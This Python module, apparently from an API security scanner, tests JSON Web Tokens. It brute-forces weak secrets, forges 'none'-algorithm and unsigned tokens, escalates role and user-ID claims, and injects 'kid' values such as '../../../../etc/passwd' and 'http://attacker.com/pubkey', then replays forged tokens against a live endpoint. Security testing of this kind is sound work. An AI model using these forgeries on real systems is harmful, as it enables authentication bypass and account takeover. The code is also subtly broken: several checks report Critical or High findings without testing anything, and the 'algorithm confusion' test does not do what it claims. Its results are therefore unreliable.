"""
JWT Security Analyzer

Comprehensive JWT (JSON Web Token) security testing including weak secret detection,
algorithm confusion attacks, and token manipulation vulnerabilities.
"""

import json
import base64
import hashlib
import hmac
import time
from typing import List, Dict, Optional, Any, Tuple
from enum import Enum
from dataclasses import dataclass
import logging
import asyncio

import jwt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

from ..core.http_client import HTTPClient
from ..core.models import Vulnerability


class JWTVulnerabilityType(Enum):
    """JWT vulnerability types"""
    WEAK_SECRET = "weak_secret"
    ALGORITHM_CONFUSION = "algorithm_confusion"
    NULL_SIGNATURE = "null_signature"
    EXPIRED_TOKEN = "expired_token"
    INVALID_SIGNATURE = "invalid_signature"
    CLAIMS_MANIPULATION = "claims_manipulation"
    KID_INJECTION = "kid_injection"
    JWK_INJECTION = "jwk_injection"


@dataclass
class JWTVulnerability:
    """JWT-specific vulnerability information"""
    vuln_type: JWTVulnerabilityType
    severity: str
    title: str
    description: str
    original_token: str
    malicious_token: Optional[str] = None
    evidence: Optional[Dict[str, Any]] = None


class JWTAnalyzer:
    """JWT security analyzer for comprehensive token testing"""

    def __init__(self, http_client: HTTPClient):
        self.http_client = http_client
        self.logger = logging.getLogger(__name__)

        # Common weak secrets for brute forcing
        self.weak_secrets = [
            "secret", "password", "123456", "admin", "test", "key",
            "jwt", "token", "auth", "api", "default", "changeme",
            "HS256", "HS384", "HS512", "RS256", "your-256-bit-secret",
            "your-secret-key", "my-secret", "super-secret", ""
        ]

    async def analyze_jwt_security(self, token: str) -> List[Vulnerability]:
        """Comprehensive JWT security analysis"""
        vulnerabilities = []

        try:
            # Parse JWT structure
            jwt_data = self._parse_jwt_structure(token)
            if not jwt_data:
                return vulnerabilities

            header, payload, signature = jwt_data

            # Test for weak secrets
            weak_secret_vulns = await self._test_weak_secrets(token, header)
            vulnerabilities.extend(weak_secret_vulns)

            # Test algorithm confusion attacks
            algo_vulns = await self._test_algorithm_confusion(token, header, payload)
            vulnerabilities.extend(algo_vulns)

            # Test null signature bypass
            null_sig_vulns = await self._test_null_signature(token, header, payload)
            vulnerabilities.extend(null_sig_vulns)

            # Test claims manipulation
            claims_vulns = await self._test_claims_manipulation(token, header, payload)
            vulnerabilities.extend(claims_vulns)

            # Test key confusion attacks
            key_vulns = await self._test_key_confusion(token, header, payload)
            vulnerabilities.extend(key_vulns)

            # Validate token structure and claims
            structure_vulns = await self._validate_token_structure(header, payload)
            vulnerabilities.extend(structure_vulns)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error analyzing JWT security: {e}")
            return []

    def _parse_jwt_structure(self, token: str) -> Optional[Tuple[Dict, Dict, str]]:
        """Parse JWT into header, payload, and signature components"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            # Decode header and payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            signature = parts[2]

            return header, payload, signature

        except Exception as e:
            self.logger.error(f"Error parsing JWT structure: {e}")
            return None

    async def _test_weak_secrets(self, token: str, header: Dict) -> List[Vulnerability]:
        """Test for weak HMAC secrets"""
        vulnerabilities = []

        try:
            algorithm = header.get('alg', '').upper()
            if not algorithm.startswith('HS'):
                return vulnerabilities

            # Test common weak secrets
            for secret in self.weak_secrets:
                try:
                    decoded = jwt.decode(token, secret, algorithms=[algorithm])

                    # If successful, we found a weak secret
                    vuln = Vulnerability(
                        vuln_type="JWT_WEAK_SECRET",
                        severity="Critical",
                        title="JWT Weak Secret Key",
                        description=f"JWT token signed with weak secret: '{secret}'",
                        evidence={
                            "weak_secret": secret,
                            "algorithm": algorithm,
                            "decoded_payload": decoded
                        },
                        endpoint="N/A"
                    )
                    vulnerabilities.append(vuln)
                    break

                except jwt.InvalidTokenError:
                    continue

            # Test with wordlist if no weak secret found
            if not vulnerabilities:
                wordlist_vulns = await self._brute_force_with_wordlist(token, algorithm)
                vulnerabilities.extend(wordlist_vulns)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error testing weak secrets: {e}")
            return []

    async def _test_algorithm_confusion(self, token: str, header: Dict, payload: Dict) -> List[Vulnerability]:
        """Test for algorithm confusion attacks"""
        vulnerabilities = []

        try:
            original_alg = header.get('alg', '')

            # Test RSA to HMAC confusion
            if original_alg.startswith('RS'):
                confused_header = header.copy()
                confused_header['alg'] = 'HS256'

                # Create token with 'none' algorithm
                confused_token = self._create_jwt_token(confused_header, payload, '')

                vuln = Vulnerability(
                    vuln_type="JWT_ALGORITHM_CONFUSION",
                    severity="High",
                    title="JWT Algorithm Confusion Attack",
                    description=f"Token algorithm changed from {original_alg} to HS256",
                    evidence={
                        "original_algorithm": original_alg,
                        "confused_algorithm": "HS256",
                        "malicious_token": confused_token
                    },
                    endpoint="N/A"
                )
                vulnerabilities.append(vuln)

            # Test 'none' algorithm bypass
            none_header = header.copy()
            none_header['alg'] = 'none'
            none_token = self._create_jwt_token(none_header, payload, '')

            vuln = Vulnerability(
                vuln_type="JWT_NONE_ALGORITHM",
                severity="Critical",
                title="JWT 'none' Algorithm Bypass",
                description="Token created with 'none' algorithm to bypass signature verification",
                evidence={
                    "original_algorithm": original_alg,
                    "bypass_algorithm": "none",
                    "malicious_token": none_token
                },
                endpoint="N/A"
            )
            vulnerabilities.append(vuln)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error testing algorithm confusion: {e}")
            return []

    async def _test_null_signature(self, token: str, header: Dict, payload: Dict) -> List[Vulnerability]:
        """Test for null signature bypass"""
        vulnerabilities = []

        try:
            # Create token with empty signature
            parts = token.split('.')
            null_sig_token = f"{parts[0]}.{parts[1]}."

            vuln = Vulnerability(
                vuln_type="JWT_NULL_SIGNATURE",
                severity="Critical",
                title="JWT Null Signature Bypass",
                description="Token created with null/empty signature",
                evidence={
                    "original_token": token,
                    "null_signature_token": null_sig_token
                },
                endpoint="N/A"
            )
            vulnerabilities.append(vuln)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error testing null signature: {e}")
            return []

    async def _test_claims_manipulation(self, token: str, header: Dict, payload: Dict) -> List[Vulnerability]:
        """Test for claims manipulation vulnerabilities"""
        vulnerabilities = []

        try:
            # Test privilege escalation through claims modification
            privilege_claims = ['role', 'admin', 'is_admin', 'permissions', 'scope', 'level']

            for claim in privilege_claims:
                if claim in payload:
                    modified_payload = payload.copy()

                    # Try to escalate privileges
                    if isinstance(payload[claim], bool):
                        modified_payload[claim] = True
                    elif isinstance(payload[claim], str):
                        modified_payload[claim] = 'admin'
                    elif isinstance(payload[claim], list):
                        modified_payload[claim] = ['admin', 'superuser', '*']
                    elif isinstance(payload[claim], int):
                        modified_payload[claim] = 999

                    modified_token = self._create_jwt_token(header, modified_payload, '')

                    vuln = Vulnerability(
                        vuln_type="JWT_CLAIMS_MANIPULATION",
                        severity="High",
                        title="JWT Claims Manipulation",
                        description=f"Modified '{claim}' claim for privilege escalation",
                        evidence={
                            "original_claim": f"{claim}: {payload[claim]}",
                            "modified_claim": f"{claim}: {modified_payload[claim]}",
                            "malicious_token": modified_token
                        },
                        endpoint="N/A"
                    )
                    vulnerabilities.append(vuln)

            # Test user ID manipulation
            user_claims = ['user_id', 'uid', 'id', 'sub', 'user']
            for claim in user_claims:
                if claim in payload:
                    modified_payload = payload.copy()
                    modified_payload[claim] = '1'  # Try to access admin user

                    modified_token = self._create_jwt_token(header, modified_payload, '')

                    vuln = Vulnerability(
                        vuln_type="JWT_USER_ID_MANIPULATION",
                        severity="High",
                        title="JWT User ID Manipulation",
                        description=f"Modified '{claim}' claim to access other user data",
                        evidence={
                            "original_user": f"{claim}: {payload[claim]}",
                            "target_user": f"{claim}: 1",
                            "malicious_token": modified_token
                        },
                        endpoint="N/A"
                    )
                    vulnerabilities.append(vuln)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error testing claims manipulation: {e}")
            return []

    async def _test_key_confusion(self, token: str, header: Dict, payload: Dict) -> List[Vulnerability]:
        """Test for key confusion attacks (kid, jwk injection)"""
        vulnerabilities = []

        try:
            # Test kid (Key ID) injection
            if 'kid' in header:
                malicious_kids = [
                    '../../../dev/null',
                    '/dev/null',
                    'http://attacker.com/pubkey',
                    'file:///etc/passwd',
                    '../../../../etc/passwd'
                ]

                for malicious_kid in malicious_kids:
                    modified_header = header.copy()
                    modified_header['kid'] = malicious_kid

                    modified_token = self._create_jwt_token(modified_header, payload, '')

                    vuln = Vulnerability(
                        vuln_type="JWT_KID_INJECTION",
                        severity="High",
                        title="JWT Key ID (kid) Injection",
                        description=f"Injected malicious kid parameter: {malicious_kid}",
                        evidence={
                            "original_kid": header['kid'],
                            "malicious_kid": malicious_kid,
                            "malicious_token": modified_token
                        },
                        endpoint="N/A"
                    )
                    vulnerabilities.append(vuln)

            # Test JWK injection
            if header.get('alg', '').startswith('RS'):
                # Create a malicious JWK
                malicious_jwk = {
                    "kty": "RSA",
                    "use": "sig",
                    "n": "malicious_public_key",
                    "e": "AQAB"
                }

                modified_header = header.copy()
                modified_header['jwk'] = malicious_jwk

                modified_token = self._create_jwt_token(modified_header, payload, '')

                vuln = Vulnerability(
                    vuln_type="JWT_JWK_INJECTION",
                    severity="Critical",
                    title="JWT Public Key (JWK) Injection",
                    description="Injected malicious JWK in token header",
                    evidence={
                        "malicious_jwk": malicious_jwk,
                        "malicious_token": modified_token
                    },
                    endpoint="N/A"
                )
                vulnerabilities.append(vuln)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error testing key confusion: {e}")
            return []

    async def _validate_token_structure(self, header: Dict, payload: Dict) -> List[Vulnerability]:
        """Validate JWT structure and identify security issues"""
        vulnerabilities = []

        try:
            # Check for missing required claims
            required_claims = ['exp', 'iat', 'iss', 'aud']
            missing_claims = [claim for claim in required_claims if claim not in payload]

            if missing_claims:
                vuln = Vulnerability(
                    vuln_type="JWT_MISSING_CLAIMS",
                    severity="Medium",
                    title="JWT Missing Security Claims",
                    description=f"Token missing security claims: {', '.join(missing_claims)}",
                    evidence={"missing_claims": missing_claims},
                    endpoint="N/A"
                )
                vulnerabilities.append(vuln)

            # Check for expired tokens
            if 'exp' in payload:
                current_time = int(time.time())
                if payload['exp'] < current_time:
                    vuln = Vulnerability(
                        vuln_type="JWT_EXPIRED_TOKEN",
                        severity="Medium",
                        title="JWT Token Expired",
                        description="Token has expired but may still be accepted",
                        evidence={
                            "expired_at": payload['exp'],
                            "current_time": current_time
                        },
                        endpoint="N/A"
                    )
                    vulnerabilities.append(vuln)

            # Check for overly long expiration
            if 'exp' in payload and 'iat' in payload:
                token_lifetime = payload['exp'] - payload['iat']
                if token_lifetime > 86400 * 30:  # 30 days
                    vuln = Vulnerability(
                        vuln_type="JWT_LONG_EXPIRATION",
                        severity="Low",
                        title="JWT Long Expiration Time",
                        description=f"Token has unusually long lifetime: {token_lifetime} seconds",
                        evidence={"lifetime_seconds": token_lifetime},
                        endpoint="N/A"
                    )
                    vulnerabilities.append(vuln)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error validating token structure: {e}")
            return []

    def _create_jwt_token(self, header: Dict, payload: Dict, signature: str) -> str:
        """Create a JWT token from components"""
        try:
            # Encode header and payload
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')

            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')

            return f"{encoded_header}.{encoded_payload}.{signature}"

        except Exception as e:
            self.logger.error(f"Error creating JWT token: {e}")
            return ""

    async def _brute_force_with_wordlist(self, token: str, algorithm: str) -> List[Vulnerability]:
        """Brute force JWT secret with wordlist"""
        vulnerabilities = []

        try:
            # Extended wordlist for brute forcing
            extended_wordlist = [
                "admin", "password", "123456", "secret", "key", "jwt",
                "token", "test", "user", "guest", "root", "default",
                "changeme", "123456789", "qwerty", "abc123", "password123",
                "admin123", "letmein", "welcome", "monkey", "dragon"
            ]

            for secret in extended_wordlist:
                try:
                    decoded = jwt.decode(token, secret, algorithms=[algorithm])

                    vuln = Vulnerability(
                        vuln_type="JWT_WEAK_SECRET",
                        severity="Critical",
                        title="JWT Weak Secret Key (Wordlist)",
                        description=f"JWT token cracked with secret: '{secret}'",
                        evidence={
                            "cracked_secret": secret,
                            "algorithm": algorithm,
                            "decoded_payload": decoded
                        },
                        endpoint="N/A"
                    )
                    vulnerabilities.append(vuln)
                    break

                except jwt.InvalidTokenError:
                    continue

                # Rate limiting to avoid overwhelming the system
                await asyncio.sleep(0.01)

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error in wordlist brute force: {e}")
            return []

    async def test_jwt_in_context(self, token: str, test_endpoint: str) -> List[Vulnerability]:
        """Test JWT token in the context of actual API calls"""
        vulnerabilities = []

        try:
            jwt_data = self._parse_jwt_structure(token)
            if not jwt_data:
                return vulnerabilities

            header, payload, signature = jwt_data

            # Test original token
            original_response = await self.http_client.get(
                test_endpoint,
                headers={"Authorization": f"Bearer {token}"}
            )

            if not original_response or original_response.status_code != 200:
                return vulnerabilities

            # Test with modified tokens
            modified_tokens = []

            # Test with expired token (if not already expired)
            if 'exp' in payload:
                expired_payload = payload.copy()
                expired_payload['exp'] = int(time.time()) - 3600  # 1 hour ago
                expired_token = self._create_jwt_token(header, expired_payload, signature)
                modified_tokens.append(("expired", expired_token))

            # Test with privilege escalation
            if 'role' in payload:
                admin_payload = payload.copy()
                admin_payload['role'] = 'admin'
                admin_token = self._create_jwt_token(header, admin_payload, signature)
                modified_tokens.append(("privilege_escalation", admin_token))

            # Test each modified token
            for test_type, modified_token in modified_tokens:
                test_response = await self.http_client.get(
                    test_endpoint,
                    headers={"Authorization": f"Bearer {modified_token}"}
                )

                if test_response and test_response.status_code == 200:
                    vuln = Vulnerability(
                        vuln_type=f"JWT_{test_type.upper()}_ACCEPTED",
                        severity="High",
                        title=f"JWT {test_type.replace('_', ' ').title()} Accepted",
                        description=f"Modified JWT token ({test_type}) was accepted by the API",
                        evidence={
                            "test_type": test_type,
                            "endpoint": test_endpoint,
                            "modified_token": modified_token
                        },
                        endpoint=test_endpoint
                    )
                    vulnerabilities.append(vuln)

                await asyncio.sleep(0.5)  # Rate limiting

            return vulnerabilities

        except Exception as e:
            self.logger.error(f"Error testing JWT in context: {e}")
            return []
